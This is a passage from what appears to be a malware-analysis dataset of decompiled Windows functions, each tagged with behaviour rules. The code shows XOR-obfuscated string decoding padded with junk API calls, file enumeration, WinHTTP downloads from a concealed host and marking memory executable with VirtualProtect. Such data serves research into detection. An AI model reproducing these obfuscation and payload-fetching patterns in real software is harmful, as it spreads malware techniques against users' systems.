0x1b452b75;\n                            var_93h._0_1_ = 0x66;\n                            var_93h._2_2_ = 0x454e;\n                            var_8fh = 0x76;\n                            var_8h = 0x6676454e;\n                            var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x75);\n                            var_93h._1_1_ = var_b2h._2_1_;\n                            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x4d);\n                            iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                            iVar7 = 0;\n                            var_cch = iVar10;\n                            unique0x10000637 = &var_b4h - iVar10;\n                            do {\n                                iVar8 = (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n                                if (iVar8 != 0xfcf843) {\n                                    *(iVar7 + iVar10) =\n                                         *(&var_8h + iVar7 % var_b8h) ^ (iVar7 + iVar10)[&var_b4h - iVar10];\n                                }\n                                iVar7 = iVar7 + 1;\n                            } while (iVar7 < 0x26);\n                            _var_50h = var_44h;\n                            stack0xffffffec = 0;\n                            var_8ch = 0x6c777366;\n                            var_88h._0_2_ = 0x496f;\n                            pcVar14 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                            var_54h = iVar10;\n                            do {\n                                var_40h = 0x6c047343;\n                                var_3ch = 0x73434933;\n                                var_38h = 0x49336c04;\n                                var_34h = 0x6c047343;\n                                var_30h = 0x73134933;\n                                var_2ch = 0x49056c06;\n                                var_28h = 0x6c1c7305;\n                                var_24h = 10;\n                                var_23h = 0x49;\n                                var_22h._0_1_ = 1;\n                                var_22h._1_2_ = 0x273;\n                                stack0xffffffdd = 0x76c;\n                                var_1dh._0_2_ = 0xa49;\n                                var_1dh._2_2_ = 0x5973;\n                                var_19h._0_2_ = 0x1b6c;\n                                var_19h._2_1_ = 0x49;\n                                var_19h._3_1_ = 0xb;\n                                var_15h = 0x773;\n                                var_13h = 0x6f6c;\n                                var_11h._0_1_ = 0x49;\n                                uVar3 = (*pcVar14)(8, 0x61);\n                                iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                                iVar7 = 0;\n                                var_c8h = &var_40h - iVar10;\n                                do {\n                                    iVar8 = (*_sym.imp.KERNEL32.dll_IsSystemResumeAutomatic)();\n                                    puVar5 = ARG_0;\n                                    if (iVar8 != 0xe7be9b) {\n                                        *(iVar7 + iVar10) =\n                                             *(&var_8ch + iVar7 % var_bch) ^ (iVar7 + iVar10)[&var_40h - iVar10];\n                                    }\n                                    iVar7 = iVar7 + 1;\n                                } while (iVar7 < 0x30);\n                                (*_sym.imp.USER32.dll_wsprintfW)\n                                          (ARG_0, iVar10, var_5ch, &lpString1, (&var_54h)[stack0xffffffec]);\n                                iVar7 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(puVar5);\n                                pcVar14 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                                if (iVar7 != -1) {\n                                    fcn.0040fddc();\n                                    var_c4h = 1;\n                                }\n                                uVar3 = (*pcVar14)(0, iVar10);\n                                pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n                                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                                *NULL = stack0xffffffec + 1;\n                            } while (*NULL < 2);\n                            uVar3 = (*pcVar14)(0, var_cch);\n                            (*pcVar2)(uVar3);\n                            uVar3 = (*pcVar14)(0, var_44h);\n                            (*pcVar2)(uVar3);\n                            iVar10 = var_d0h;\n                            iVar8 = lpString2;\n                        }\n                        uVar3 = (*pcVar14)(0, iVar10);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                        uVar3 = (*pcVar14)(0, iVar8);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                        iVar10 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(hFindFile, &lpFindFileData);\n                    } while (iVar10 != 0);\n                }\n                (*_sym.imp.KERNEL32.dll_FindClose)(hFindFile);\n                uVar3 = (*pcVar14)(0, lpMem);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                piVar4 = var_5ch;\n            }\n        }\n        if (lpFileName != NULL) {\n            uVar3 = (*pcVar14)(0, lpFileName);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n        if (piVar4 != NULL) {\n            uVar3 = (*pcVar14)(0, piVar4);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n        if (ARG_0 != NULL) {\n            uVar3 = (*pcVar14)(0, ARG_0);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n    }\n    return var_c4h;\n}\n",
        "token_count": 4215
    },
    "00405d90": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00405d90(char *param_1, char *param_2)\n\n{\n    uint uVar1;\n    char *pcVar2;\n    char *pcVar3;\n    char cVar4;\n    char *pcVar5;\n    uint uVar6;\n    uint var_4h;\n    \n    uVar6 = 0;\n    if (param_1 != NULL) {\n        if (param_2 == 0xffffffff) {\n            param_2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(param_1);\n        }\n        pcVar2 = param_2;\n        if (1 < param_2) {\n            do {\n                pcVar2 = pcVar2 + -1;\n                if (pcVar2 < 0) goto code_r0x00405dd2;\n                pcVar3 = param_1 + pcVar2;\n            } while (*pcVar3 != '\\\\');\n            if (pcVar3 != NULL) {\n                param_2 = param_1 + (param_2 - (pcVar3 + 1));\n                param_1 = pcVar3 + 1;\n            }\n        }\ncode_r0x00405dd2:\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, param_2 + 1);\n        pcVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        if (pcVar2 != NULL) {\n            pcVar3 = pcVar2;\n            pcVar5 = param_2;\n            if ((*param_1 == '\\\"') && (param_1[param_2 + -1] == '\\\"')) {\n                param_2 = param_2 + -2;\n                param_1 = param_1 + 1;\n                pcVar5 = param_2;\n            }\n            for (; param_2 != NULL; param_2 = param_2 + -1) {\n                *pcVar3 = *param_1;\n                param_1 = param_1 + 1;\n                pcVar3 = pcVar3 + 1;\n            }\n            pcVar2[pcVar5] = '\\0';\n            cVar4 = *pcVar2;\n            pcVar3 = pcVar2;\n            while (cVar4 != '\\0') {\n                cVar4 = *pcVar3;\n                if (cVar4 + 0x9fU < 0x1a) {\n                    cVar4 = cVar4 + -0x20;\n                }\n                *pcVar3 = cVar4;\n                pcVar3 = pcVar3 + 1;\n                cVar4 = *pcVar3;\n            }\n            uVar6 = fcn.00401000();\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, pcVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        }\n    }\n    return uVar6;\n}\n",
        "token_count": 638
    },
    "00406205": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00406205(int32_t *param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if ((param_1 != NULL) && (param_2 != NULL)) {\n        if (param_1[1] != 0) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, param_1[1]);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        }\n        uVar2 = (*pcVar1)(8, *param_2);\n        puVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        param_1[1] = puVar3;\n        if (puVar3 != NULL) {\n            for (iVar4 = *param_2; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            *param_1 = *param_2;\n            puVar3 = param_2[1];\n            puVar5 = param_1[1];\n            for (iVar4 = *param_2; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar5 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar5 = puVar5 + 1;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 369
    },
    "00406540": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00406540(uint32_t *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    uint in_EDX;\n    uint var_4h;\n    \n    puVar2 = arg_8h;\ncode_r0x0040657e:\n    do {\n        puVar2[1] = 0;\n        *puVar2 = 0;\n        var_4h = 0;\n        arg_8h = NULL;\n        iVar3 = fcn.00406d92(in_EDX, 0, &arg_8h, &var_4h);\n        if ((iVar3 != 0) || (arg_8h == NULL)) {\ncode_r0x004065a2:\n            fcn.0040625c();\n            goto code_r0x004065a9;\n        }\n        uVar1 = *puVar2;\n        if (uVar1 < arg_8h) {\n            (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n            fcn.0040625c();\n            goto code_r0x0040657e;\n        }\n        if (uVar1 < 5) goto code_r0x004065a2;\n        if (*puVar2[1] == uVar1) {\ncode_r0x004065a9:\n            return *puVar2 != 0;\n        }\n    } while( true );\n}\n",
        "token_count": 320
    },
    "004065b9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl\nfcn.004065b9(ushort *lpdwNumberOfBytesAvailable, uint *lpdwNumberOfBytesRead, int32_t *arg_10h, int32_t *arg_14h, \n            int32_t arg_18h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    ushort *puVar4;\n    uint uVar5;\n    int32_t in_ECX;\n    int32_t iVar6;\n    int32_t *in_EDX;\n    int32_t iVar7;\n    code *pcVar8;\n    uint var_41ch;\n    uint lpszHeaders;\n    uint var_114h;\n    uint var_110h;\n    int32_t var_10ch;\n    int32_t var_108h;\n    int32_t var_104h;\n    uint var_100h;\n    uint var_fch;\n    uint var_f8h;\n    uint *var_f4h;\n    int32_t var_f0h;\n    int32_t var_ech;\n    uint lpdwBufferLength;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d5h;\n    uint var_d1h;\n    uint var_cdh;\n    uint var_c9h;\n    uint var_c5h;\n    uint var_c1h;\n    uint var_bdh;\n    uint var_b9h;\n    uint var_b5h;\n    uint var_b1h;\n    uint var_adh;\n    uint var_a9h;\n    uint var_a5h;\n    uint var_a1h;\n    uint var_9dh;\n    uint var_99h;\n    uint var_95h;\n    uint var_91h;\n    uint var_8dh;\n    uint var_89h;\n    uint var_85h;\n    uint var_81h;\n    uint var_7dh;\n    uint var_79h;\n    uint var_75h;\n    uint var_71h;\n    uint var_6dh;\n    uint var_69h;\n    uint var_65h;\n    uint var_61h;\n    uint var_5dh;\n    uint var_59h;\n    uint var_55h;\n    uint var_51h;\n    uint var_4dh;\n    uint var_49h;\n    int32_t *var_44h;\n    uint var_40h;\n    int32_t var_3ch;\n    int32_t lpMultiByteStr;\n    uint32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint lpBuffer;\n    uint *var_ch;\n    uint var_8h;\n    \n    puVar3 = &lpszHeaders;\n    var_44h = in_EDX;\n    lpMultiByteStr = in_ECX;\n    for (iVar6 = 0x100; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    puVar3 = &var_41ch;\n    for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    if (lpdwNumberOfBytesAvailable == 0x40) {\n        var_f8h = 0;\n        var_fch = 0x34367964;\ncode_r0x0040662e:\n        var_100h = 0x6f62722f;\n    }\n    else {\n        if (lpdwNumberOfBytesAvailable == 0x20) {\n            var_f8h = 0;\ncode_r0x00406624:\n            var_fch = 0x32337964;\n            goto code_r0x0040662e;\n        }\n        if (lpdwNumberOfBytesAvailable == 0x140) {\n            var_f8h = 0x30;\n            goto code_r0x00406624;\n        }\n    }\n    var_f4h = &var_100h;\n    if (lpdwNumberOfBytesRead != NULL) {\n        var_f4h = lpdwNumberOfBytesRead;\n    }\n    iVar6 = (*_sym.imp.WS2_32.dll_gethostbyname)();\n    pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar6 == 0) {\n        return 3;\n    }\n    lpdwNumberOfBytesAvailable = 0x1;\n    var_104h = 6;\n    if (*0x41cb74 == 0) {\n        var_e4h = 0x63074500;\n        var_e0h = 0x45244f17;\n        var_dch._0_2_ = 0x6304;\n        var_dch._2_1_ = 1;\n        stack0xffffff23 = 0x47452c4f;\n        var_d5h = 0x634f5863;\n        var_d1h = 0x4d635845;\n        var_cdh = 0x3f45654f;\n        var_c9h = 0x234f0463;\n        var_c5h = 0x2630c45;\n        var_c1h = 0x1b453a4f;\n        var_bdh = 0x34f4d63;\n        var_b9h = 0x4d633c45;\n        var_b5h = 0x46457b4f;\n        var_b1h = 0x764f5c63;\n        var_adh = 0x3a634845;\n        var_a9h._0_2_ = 0x244f;\n        var_a9h._2_1_ = 0x45;\n        var_a9h._3_1_ = 6;\n        var_a5h = 0x794f5b63;\n        var_a1h = 0x4d635345;\n        var_9dh = 0x5e45354f;\n        var_99h = 0x764f5963;\n        var_95h = 0x1f634845;\n        var_91h = 0x52453b4f;\n        var_8dh = 0x784f5f63;\n        var_89h = 0x5d634645;\n        var_85h = 0x4845644f;\n        var_81h = 0x284f2a63;\n        var_7dh._0_2_ = 0xb45;\n        var_7dh._2_1_ = 99;\n        var_79h = 0x4745224f;\n        var_75h = 0x7c4f5f63;\n        var_71h = 0x5d635845;\n        var_6dh = 0x59457d4f;\n        var_69h = 0x7c4f5d63;\n        var_65h = 0x2b634845;\n        var_61h = 0x1a45244f;\n        var_5dh = 0x2b4f0863;\n        var_59h = 0x15630745;\n        var_55h = 0x5a45624f;\n        var_51h = 0x634f5863;\n        var_4dh = 0x6d635845;\n        var_49h._0_1_ = 0x4f;\n        var_ch = 0x6368454d;\n        var_8h = CONCAT22(var_8h._2_2_, 0x4f6d);\n        var_7dh._3_1_ = var_a9h._3_1_;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x139);\n        iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        iVar7 = 0;\n        lpdwNumberOfBytesRead = &var_e4h - iVar6;\n        do {\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n            if (iVar2 != 0xd36770) {\n                *(iVar7 + iVar6) = *(&var_ch + iVar7 % var_104h) ^ *(lpdwNumberOfBytesRead + iVar7 + iVar6);\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0x9c);\n        *0x41cb74 = (*_sym.imp.WINHTTP.dll_WinHttpOpen)(iVar6, 0, 0, 0, 0);\n        uVar1 = lpdwNumberOfBytesAvailable;\n        if (*0x41cb74 == 0) {\n            uVar5 = (*pcVar8)(0, iVar6);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n            return uVar1;\n        }\n        (*_sym.imp.WINHTTP.dll_WinHttpSetTimeouts)(*0x41cb74, 5000, 5000, 5000, 5000);\n        uVar1 = (*pcVar8)(0, iVar6);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        in_ECX = lpMultiByteStr;\n    }\n    if (in_ECX == 0) {\n        lpdwNumberOfBytesRead = NULL;\n    }\n    else {\n        iVar6 = (*_sym.imp.KERNEL32.dll_lstrlenA)(in_ECX);\n        uVar1 = (*pcVar8)(8, (iVar6 + 1) * 2);\n        lpdwNumberOfBytesRead = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        *lpdwNumberOfBytesRead = 0;\n        (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(0, 0, lpMultiByteStr, 0xffffffff, lpdwNumberOfBytesRead, iVar6 + 1)\n        ;\n    }\n    lpMultiByteStr = (*_sym.imp.WINHTTP.dll_WinHttpConnect)(*0x41cb74, lpdwNumberOfBytesRead, 0x50, 0);\n    stack0xffffffc9 = stack0xffffffc9 & 0xffffff | 0x21000000;\n    stack0xffffffcd = 0x23520c6a;\n    stack0xffffffd1 = 0x21781a49;\n    stack0xffffffd5 = 0x576a7357;\n    stack0xffffffd9 = 0x4f497852;\n    stack0xffffffdd = 0x73572178;\n    stack0xffffffe1 = 0x33525d6a;\n    stack0xffffffe5 = 0x52784549;\n    var_14h._1_1_ = 0x57;\n    var_ch = 0x52786a49;\n    var_8h = CONCAT31(var_8h._1_3_, 0x57);\n    uVar1 = (*pcVar8)(8, 0x3d);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    var_108h = 5;\n    iVar7 = 0;\n    var_3ch = &var_30h - iVar6;\n    var_10ch = iVar6;\n    do {\n        iVar2 = (*_sym.imp.USER32.dll_CreateMenu)();\n        if (iVar2 != 0x873558) {\n            *(iVar7 + iVar6) = *(&var_ch + iVar7 % var_108h) ^ (iVar7 + iVar6)[var_3ch];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x1e);\n    (*_sym.imp.USER32.dll_wsprintfW)(&lpszHeaders, iVar6, lpdwNumberOfBytesRead, 0x50);\n    uVar1 = (*pcVar8)(0, lpdwNumberOfBytesRead);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    puVar3 = var_f4h;\n    if (lpMultiByteStr == 0) goto code_r0x00406d6d;\n    if (var_f4h == NULL) {\n        lpdwNumberOfBytesAvailable = NULL;\n    }\n    else {\n        iVar6 = (*_sym.imp.KERNEL32.dll_lstrlenA)(var_f4h);\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, (iVar6 + 1) * 2);\n        lpdwNumberOfBytesAvailable = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        *lpdwNumberOfBytesAvailable = 0;\n        (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(0, 0, puVar3, 0xffffffff, lpdwNumberOfBytesAvailable, iVar6 + 1);\n        pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    }\n    var_40h = 0x57204b0f;\n    var_3ch = 0x4b484b64;\n    var_ch = 0x57654b48;\n    var_8h = CONCAT22(var_8h._2_2_, 0x4b30);\n    uVar1 = (*pcVar8)(8, 0x11);\n    puVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar6 = 0;\n    lpdwNumberOfBytesRead = &var_40h - puVar3;\n    var_f4h = puVar3;\n    do {\n        iVar7 = (*_sym.imp.USER32.dll_GetInputState)();\n        if (iVar7 != 0xe836e5) {\n            *(iVar6 + puVar3) = *(&var_ch + iVar6 % var_104h) ^ (iVar6 + puVar3)[&var_40h - puVar3];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 8);\n    puVar4 = (*_sym.imp.WINHTTP.dll_WinHttpOpenRequest)\n                       (lpMultiByteStr, puVar3, lpdwNumberOfBytesAvailable, 0, 0, 0, 0x800140);\n    lpdwNumberOfBytesRead = puVar4;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpdwNumberOfBytesAvailable);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    iVar6 = var_10ch;\n    if (puVar4 == NULL) {\ncode_r0x00406d47:\n        lpdwNumberOfBytesAvailable = 0x1;\n    }\n    else {\n        var_110h = 0x3300;\n        var_114h = 8;\n        iVar7 = fcn.00401484();\n        if (iVar7 != 0) {\n            var_8h = 0;\n            var_ch = &var_41ch;\n            lpBuffer = 3;\n            (*_sym.imp.WINHTTP.dll_WinHttpSetOption)(puVar4, 0x26, &lpBuffer, 0xc);\n        }\n        (*_sym.imp.WINHTTP.dll_WinHttpSetOption)(puVar4, 0x1f, &var_110h, 4);\n        (*_sym.imp.WINHTTP.dll_WinHttpSetOption)(puVar4, 0x3f, &var_114h, 4);\n        if (arg_18h != 0) {\n            var_34h._0_1_ = 5;\n            stack0xffffffc9 = 0x1e6d1070;\n            stack0xffffffcd = 0x8711757;\n            stack0xffffffd1 = 0x51706d70;\n            stack0xffffffd5 = 0x957126d;\n            stack0xffffffd9 = 0x32701971;\n            stack0xffffffdd = 0x4d6d0270;\n            stack0xffffffe1 = 0x9715557;\n            stack0xffffffe5 = 0x71707a70;\n            var_14h._1_1_ = 0x6d;\n            var_ch = 0x6d717057;\n            var_8h = CONCAT31(var_8h._1_3_, 0x70);\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x45);\n            iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            iVar7 = 0;\n            lpdwNumberOfBytesAvailable = &var_34h - iVar6;\n            do {\n                iVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                if (iVar2 != 0xa07de9) {\n                    *(iVar7 + iVar6) = *(&var_ch + iVar7 % var_108h) ^ *((&var_34h - iVar6) + iVar7 + iVar6);\n                }\n                iVar7 = iVar7 + 1;\n            } while (iVar7 < 0x22);\n            (*_sym.imp.USER32.dll_wsprintfW)(&lpszHeaders, iVar6, arg_18h);\n            uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(&lpszHeaders, 0x10000000);\n            puVar4 = lpdwNumberOfBytesRead;\n            (*_sym.imp.WINHTTP.dll_WinHttpAddRequestHeaders)(lpdwNumberOfBytesRead, &lpszHeaders, uVar1);\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            iVar6 = var_10ch;\n            puVar3 = var_f4h;\n        }\n        iVar7 = (*_sym.imp.WINHTTP.dll_WinHttpSendRequest)(puVar4, 0, 0xffffffff, 0, 0, 0, 0);\n        if ((iVar7 == 0) || (iVar7 = (*_sym.imp.WINHTTP.dll_WinHttpReceiveResponse)(puVar4, 0),  iVar7 == 0))\n        goto code_r0x00406d47;\n        lpdwBufferLength = 4;\n        var_f0h = 0;\n        var_ech = 0;\n        (*_sym.imp.WINHTTP.dll_WinHttpQueryHeaders)(puVar4, 0x20000005, 0, &var_f0h, &lpdwBufferLength, 0);\n        if (*arg_10h == 0) {\n            *arg_10h = var_f0h;\n        }\n        lpdwBufferLength = 4;\n        (*_sym.imp.WINHTTP.dll_WinHttpQueryHeaders)(puVar4, 0x20000013, 0, &var_ech, &lpdwBufferLength, 0);\n        if ((var_ech == 0xce) || (var_ech == 200)) {\n            if (var_44h[1] == 0) {\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, var_f0h);\n                iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                *var_44h = 0;\n                var_44h[1] = iVar7;\n            }\n            arg_18h = var_44h[1];\n            lpdwNumberOfBytesRead = NULL;\n            do {\n                lpdwNumberOfBytesAvailable = NULL;\n                iVar7 = (*_sym.imp.WINHTTP.dll_WinHttpQueryDataAvailable)(puVar4, &lpdwNumberOfBytesAvailable);\n                if ((iVar7 == 0) ||\n                   (iVar7 = (*_sym.imp.WINHTTP.dll_WinHttpReadData)\n                                      (puVar4, *var_44h + arg_18h, lpdwNumberOfBytesAvailable, &lpdwNumberOfBytesRead), \n                   iVar7 == 0)) {\n                    lpdwNumberOfBytesAvailable = 0x4;\n                    goto code_r0x00406d4d;\n                }\n                *var_44h = *var_44h + lpdwNumberOfBytesRead;\n                iVar7 = *var_44h;\n            } while (lpdwNumberOfBytesAvailable != NULL);\n            *arg_14h = iVar7;\n            if ((*arg_10h == 0) || (iVar7 == *arg_10h)) {\n                lpdwNumberOfBytesAvailable = NULL;\n            }\n            else {\n                lpdwNumberOfBytesAvailable = 0x6;\n            }\n        }\n        else {\n            lpdwNumberOfBytesAvailable = 0x3;\n        }\n    }\ncode_r0x00406d4d:\n    if (puVar4 != NULL) {\n        (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(puVar4);\n    }\n    pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar3);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\ncode_r0x00406d6d:\n    uVar1 = lpdwNumberOfBytesAvailable;\n    uVar5 = (*pcVar8)(0, iVar6);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    if (lpMultiByteStr != 0) {\n        (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(lpMultiByteStr);\n    }\n    return uVar1;\n}\n",
        "token_count": 4822
    },
    "004079f6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004079f6(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_28h;\n    uint var_1ch;\n    uint var_ch;\n    uint var_8h;\n    uint lpflOldProtect;\n    \n    var_28h._0_1_ = 0;\n    lpflOldProtect = 0;\n    puVar3 = &var_28h + 1;\n    for (iVar2 = 6; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    var_8h = 0;\n    var_ch = 0;\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    *0x41cb48 = fcn.00406317();\n    iVar2 = fcn.00401fd8();\n    if (iVar2 == 0) {\n        fcn.00402215();\n        fcn.0040b2d7();\n    }\n    while (iVar2 = fcn.0040bff2(),  iVar2 != 0) {\n        (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n    }\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    fcn.00405f38();\n    iVar2 = fcn.004017dd();\n    if (iVar2 != 0) {\n        if (2 < var_28h._1_1_) {\n            iVar2 = 0;\n            if (0 < var_28h._1_1_ - 2) {\n                do {\n                    *0x41caac = *0x41caac + (&var_1ch)[iVar2];\n                    iVar2 = iVar2 + 1;\n                } while (iVar2 < var_28h._1_1_ - 2);\n            }\n        }\n        *0x41caac = *0x41caac ^ 0x43103655;\n        fcn.004020be();\n    }\n    (*_sym.imp.KERNEL32.dll_VirtualProtect)(0x4122f0, 0x184, 0x40, &lpflOldProtect);\n    fcn.0040628d();\n    (*_sym.imp.KERNEL32.dll_VirtualProtect)(0x4122f0, 0x184, lpflOldProtect, &lpflOldProtect);\n    fcn.00403149();\n    fcn.00403149();\n    (*_sym.imp.KERNEL32.dll_GlobalAddAtomW)(*0x41cab8);\n    (*_sym.imp.KERNEL32.dll_AddAtomW)(*0x41cab8);\n    iVar2 = fcn.0040f720(&var_ch);\n    if (iVar2 == 0) {\n        fcn.00405ecf();\n        fcn.004076f7();\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_8h);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    }\n    return;\n}\n",
        "token_count": 702
    },
    "00407d1b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.00407d1b(int32_t *param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    uint *puVar7;\n    uint ARG_0;\n    uint lpValueName;\n    uint32_t var_58h;\n    int32_t var_54h;\n    int32_t *var_50h;\n    uint32_t var_4ch;\n    int32_t hKey;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_24h = var_24h & 0xffffff00;\n    var_50h = param_1;\n    var_20h = param_2;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    uVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    if ((((uVar2 != 0) && (param_1 != NULL)) && (*param_1 != 0)) && (param_1[1] != 0)) {\n        var_58h = uVar2;\n        fcn.00407b94();\n        hKey = fcn.00407b3b(0x20006);\n        if (hKey != 0) {\n            